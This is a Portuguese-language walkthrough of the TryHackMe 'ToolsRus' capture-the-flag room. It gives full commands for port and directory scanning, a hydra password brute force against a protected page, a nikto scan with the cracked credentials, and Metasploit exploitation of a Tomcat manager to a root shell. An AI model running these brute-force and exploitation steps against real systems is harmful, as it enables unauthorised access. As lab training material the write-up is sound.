# ToolsRus CTF


#### THM = https://tryhackme.com/room/toolsrus

> Alooow!

> Este é o meu primeiro roteiro do TRM e o desafio foi o ToolsRus
Vou compartilhar o meu caminho..

![alt text](https://i.imgur.com/fAFiFoI.png)

	Usei as seguintes ferramentas 
	-dirbuster
	-hydra
	-nmap
	-nikto
	-metasploit


# Identificando portas!
### nmap
  ```hnmap  -sV $IP```
![alt text](https://i.imgur.com/Q0EF01b.png)

### Gobuster 

Identificamos um servidor apache na porta 80 e curiosamente um Tomcat na porta 1234
Aplicamos o gobuster 
```gobuster dir -u http://10.10.139.47/ -w /usr/share/dirb/wordlists/common.txt```

![alt text](https://i.imgur.com/4UvdHSQ.png)

No diretório /guidelines encontramos o nome bob 

![alt text](https://i.imgur.com/WzIIRXh.png)

Na porta 1234 encontramos o Tomcat como esperado 

![alt text](https://i.imgur.com/CrxlCAt.png)

No diretório /protected identificamos a requisição de login e senha

![alt text](https://i.imgur.com/Fa7lkCQ.png)


Ja que identifiquei a porta 1234 vamos rodar um gobuster pra identificar novos diretórios

### Gobuster 

```gobuster dir -u http://10.10.139.47:1234/ -w /usr/share/dirb/wordlists/common.txt```

![alt text](https://i.imgur.com/59hvVpj.png)


Com a página de login encontrada vamos tentar quebrar a senha com o hydra usando o usuário bob que identificamos mais acima

### Hydra

```hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.139.47 http-get /protected```

![alt text](https://i.imgur.com/L8XzFtT.png)

Aqui encontramos login e senha 
Com essas credenciais conseguimos autenticar no Tomcat manager

![alt text](https://i.imgur.com/HRNcu6W.png)

Essas credenciais não são suficientes ainda para logar via SSH.

### Nikto
``` nikto -id bob:bubbles -h http://10.10.139.47:1234/manager/ ```
![alt text](https://i.imgur.com/YzpLnLJ.png)
Nos traz algumas paginas para analisar.. 

Com um possivel usuario ```bob``` e uma tela de login podemos fazer uma forcinha bruta e tentar descobrir a senha...
### Bora metasploit

	-set RHOST $IPDESTINO
	-set RPORT 1234
	-set httpusername bob
	-set httppasword *****
	-run
![alt text](https://i.imgur.com/9z9dnZC.png)
# Sucesso! 
O meterpreter nos dar poder para enviar comandos para a máquina

![alt text](https://i.imgur.com/7ZbXGC9.png)
Dentro de /root/ conseguimos ler a flag.txt
```cat /root/flag.txt ```

![alt text](https://i.imgur.com/z2e1Dki.png)

Com a flag e root finalizo esta sala!

[]`s

